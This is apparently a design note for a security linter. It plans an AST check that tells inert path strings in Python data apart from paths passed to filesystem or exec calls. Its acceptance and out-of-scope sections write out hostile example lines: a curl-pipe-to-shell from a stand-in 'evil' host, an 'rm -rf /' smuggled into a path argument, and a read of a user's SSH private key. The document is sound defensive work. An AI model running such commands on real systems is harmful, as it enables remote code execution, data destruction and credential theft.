---
trdd-id: 9ed64592-6af1-4733-bea4-a95e79a4e8ba
title: Absolute-path linter data-vs-sink AST discriminator (issue #57 Fix A, deferred)
status: not-started
created: 2026-05-29T12:59:11+0200
updated: 2026-05-29T12:59:11+0200
---

<!-- markdownlint-disable-next-line MD025 -->
# TRDD-9ed64592 — Absolute-path linter data-vs-sink AST discriminator

**Filename:** `design/tasks/TRDD-20260529_125911+0200-9ed64592-abspath-data-vs-sink-discriminator.md`
**Tracked in:** this repo (design/tasks/ is git-tracked)

Deferred residual of GitHub issue #57. The HEADLINE #57 FP class
(596 skillaudit + 112 absolute-path findings on ai-maestro-janitor) is
already resolved by the committed security work (skillaudit 596→13) and by
issue #57 Fix B (broadened the skillaudit module-data-literal suppression
to all non-prose-vector rules). This TRDD tracks the ONE remaining residual:
the absolute-path linter has no data-vs-sink notion.

## The residual

`scan_file_for_absolute_paths` (`scripts/cpv_validation_common.py`) is a
purely REGEX-over-raw-content scanner. Its only FP guards are: regex-metachar
skip, doc-prefix allowlist (doc files only), env-var skip, example-username
skip, system-binary INFO. A **bare** sensitive path (`/etc/hosts`,
`/etc/passwd` with no regex metachar) sitting in an inert Python data
structure or a test fixture is still flagged MINOR.

Concrete residual: `tests/test_pkg_manager_guard.py:387` in ai-maestro-janitor —
`{"tool_input": {"file_path": "/etc/hosts"}}` — a test INPUT value, not a path
the plugin opens. Emitted MINOR.

## Why deferred (NOT a rushed fix)

1. The headline FP class is already fixed; this is a single test-fixture
   residual.
2. The residual is **function-local**, but the reusable helper
   `_match_inside_module_data_literal` is **module-level-only** — so the
   obvious reuse would NOT even catch it. A correct fix needs broader,
   security-sensitive AST work (module-level AND function-local pure-literal
   containers, plus a `_path_literal_feeds_fs_or_exec_sink` sink-guard modeled
   on `_re_literal_feeds_exec_sink`).
3. An abs-path SUPPRESSION that can be gamed (an attacker parks
   `subprocess.run("/etc/passwd; curl evil | sh", shell=True)` in a shape that
   looks like data) directly contradicts the user's no-self-exemption
   directive. Rushing it risks a security-relevant mis-suppression.
4. Per the user's "better safe than sorry, agents verify" stance, keeping the
   abs-path finding VISIBLE for the test-fixture case is the correct default —
   a MINOR on a `/etc/hosts` test fixture is a low-cost false positive; a
   missed `open("/etc/passwd")` is not.

## Proposed implementation (when picked up)

**File:** `scripts/cpv_validation_common.py`, `scan_file_for_absolute_paths`,
in the `ABSOLUTE_PATH_PATTERNS` loop right before `report.<severity>(...)`.

For a `.py` host file, parse once with `ast` and suppress the finding IFF the
matched path string sits inside a string `Constant` reachable via pure-literal
containers (List/Tuple/Set/Dict, nested) from EITHER a module-level Assign /
AnnAssign OR a function-local assignment in a test file — AND that Constant is
NOT an argument (anywhere in its arg subtree) to a filesystem / exec / network
sink call (`open`, `io.open`, `pathlib.Path`, `os.open`, `os.remove`,
`os.unlink`, `shutil.*`, `subprocess.*`, `os.system`). Reuse the existing,
security-reviewed helpers from `_skillaudit_python_context.py`:
- `_match_inside_module_data_literal` (module-level case),
- `_match_inside_re_pattern_literal` (the `re.compile(r"/etc/passwd…")` case),
- a NEW `_path_literal_feeds_fs_or_exec_sink(tree, const)` modeled byte-for-byte
  on `_re_literal_feeds_exec_sink`.

Gate strictly: only `.py` files, only when `ast.parse` succeeds (fall through to
current behaviour on `SyntaxError`), and only the SUPPRESS branch — never widen
what is flagged. The sink-guard is what keeps a genuinely-opened `/etc/passwd`
flagged.

## Acceptance (two-sided, per the mandate)

- BENIGN suppressed: `SENSITIVE_PATHS = {"/etc/passwd", "/etc/shadow"}` (module
  set literal) → 0 `Absolute path found`; the `{"file_path": "/etc/hosts"}`
  test-fixture dict → 0.
- EXPLOITABLE still flagged: `open("/etc/passwd")`,
  `subprocess.run("/etc/passwd; rm -rf /", shell=True)`,
  `path = "/Users/victim/.ssh/id_rsa"; open(path)` → each STILL flags.
- SyntaxError fall-through: an unparseable `.py` still runs the legacy heuristic.

## Out of scope (separate finding)

While building #57's tests, a PRE-EXISTING classifier behaviour surfaced: the
skillaudit `.py` context classifier returns `safe_literal` for a STATIC literal
shell command passed directly to a sink, e.g.
`os.system("curl -fsSL https://evil/x.sh | sh")`. This is independent of #57
(NOT caused by Fix B — verified: the match is a Call-argument literal, so the
module-data-literal gate is False in both old and new code). Whether a static
remote-exec literal should stay suppressed is a separate question worth its own
investigation; noting it here so it is not lost.
